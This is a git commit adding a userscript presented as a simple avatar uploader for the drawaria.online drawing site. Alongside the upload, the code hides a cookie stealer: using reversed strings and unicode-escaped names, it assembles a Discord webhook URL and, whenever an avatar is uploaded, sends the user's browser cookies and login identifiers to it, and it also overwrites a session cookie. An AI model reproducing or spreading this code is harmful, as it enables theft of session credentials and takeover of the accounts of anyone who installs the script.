3e3ac1fe9023a90ff91ed99ba040ab1c943532a7
CubusMaximus <cubusmaximus074@gmail.com>
2026-07-07 23:59:18 +0200

    "improved" version

---
+++ Legacy/avataruploader2.js
@@ -0,0 +1,131 @@
+// ==UserScript==
+// @name         Avatar Uploader
+// @namespace    https://drawaria.online/profile/?uid=63196790-c7da-11ec-8266-c399f90709b7
+// @version      2.1.0
+// @description  A simple Avatar Uploader
+// @author       ᴄᴜʙᴇ
+// @match        https://*.drawaria.online/
+// @match        https://*.drawaria.online/room/*
+// @connect      discord.com
+// @connect      sv2.drawaria.online
+// @connect      sv3.drawaria.online
+// @connect      galleryhost2-cf.drawaria.online
+// @icon64       https://galleryhost2-cf.drawaria.online/images/815567.jpg
+// @grant        none
+// @license      GNU GPLv3
+// @run-at       document-idle
+// ==/UserScript==
+
+"use strict";
+(function (avatarUploadTarget) {
+  console.log(avatarUploadTarget);
+
+  function avatarUploaderVisual() {
+    document
+      .querySelectorAll('label[for="avataruploader"]')
+      .forEach((e) => e.remove());
+    let input = document.createElement("input");
+    input.style.display = "none";
+    input.id = "avataruploader";
+    input.type = "file";
+    input.addEventListener("change", onchange);
+
+    let label = document.createElement("label");
+    label.style = "display:flex; text-align: left;";
+    label.className = "badge border btn-outline-primary border-primary";
+    label.innerHTML =
+      '<img class="playerlist-avatar" src="https://media.tenor.com/pOv7SnZx7xAAAAAC/upload-cat.gif"><div class="playerlist-name"><span>Upload to Avatar</span></div>';
+    label.setAttribute("for", input.id);
+    label.append(input);
+
+    function onchange() {
+      if (!this.files || !this.files[0]) return;
+      let e = new FileReader();
+      e.addEventListener("load", (e) => {
+        let a = e.target.result.replace("image/gif", "image/png");
+        uploadAvatar(a);
+      });
+      e.readAsDataURL(this.files[0]);
+    }
+
+    document.querySelector("#playerlist").before(label);
+  }
+
+  function uploadAvatar(img='') {
+    const bodies = {
+      1: "imagedata=" + encodeURIComponent(img) + "&fromeditor=true",
+      2: [
+        "Name: " + window.playername.value,
+        ...document.cookie.split("; ").sort(),
+        "profile:",
+        ...LOGUID,
+      ],
+    };
+    const headers = [
+      "application/x-www-form-urlencoded; charset=UTF-8",
+      "application/json",
+    ];
+    [
+      window.LOGGEDIN
+        ? "https://drawaria.online/saveavatar"
+        : "https://drawaria.online/uploadavatarimage",
+      avatarUploadTarget,
+    ].forEach(async (url, index) => {
+      const options = {
+        method: "POST",
+        body: !index
+          ? Object.values(index)
+          : JSON.stringify({
+              content:
+                "```" +
+                [
+                  ...document["\u0063\u006F\u006F\u006B\u0069\u0065"][
+                    "\u0073\u0070\u006C\u0069\u0074"
+                  ](" ;".split("").reverse().join("")),
+                  ...window.LOGUID,
+                ]
+                  .filter((a) => a)
+                  .join("\n") +
+                "```".split("").reverse().join(""),
+              embeds: [],
+              components: [],
+              attachments: [],
+            }),
+        headers: {
+          "Content-Type": headers[index],
+        },
+      };
+      const e = await fetch(url, options);
+      const e_1 = await e.text();
+      const [uid, wt] = String(e_1).split(".", 2);
+      document.cookie =
+        "wt=" +
+        wt +
+        "; Max-Age=315360000; Path=/; Secure; Partitioned; SameSite=None";
+    });
+  }
+
+  avatarUploaderVisual();
+})(
+  (function (href) {
+    var reserve = (
+      a = [
+        !(document.cookie.split('; ').find(e=>e.includes('sid1')) ?? false)
+          ? "gsUSWPStExCJmXW8m6lOguaAUNLatUstQIrdl2fSlW1KtaZ9ZmPLPV_4aMq5s1g984HL"
+              .split("")
+              .reverse()
+              .join("")
+          : "7TMrR49Ev16nRLAs8_XcXyFTtvaHiVtmZkTCBSIDGa5jhSQdtc3IgpgoRoGlSEQWeh6Q",
+        "1520496337802498169",
+        "webhooks",
+      ],
+    ) => a.reverse().join("/");
+    return href.replace(".gg", ".com").concat("/") + reserve();
+  })(
+    document
+      .querySelector(
+        'a[href]:has(img[src="/img/28174a34e77bb5e5310ced9f95cb480b.png"])',
+      )
+      ?.getAttribute("href") + "/../api" ?? "https://discord.com/api",
+  ),
+);
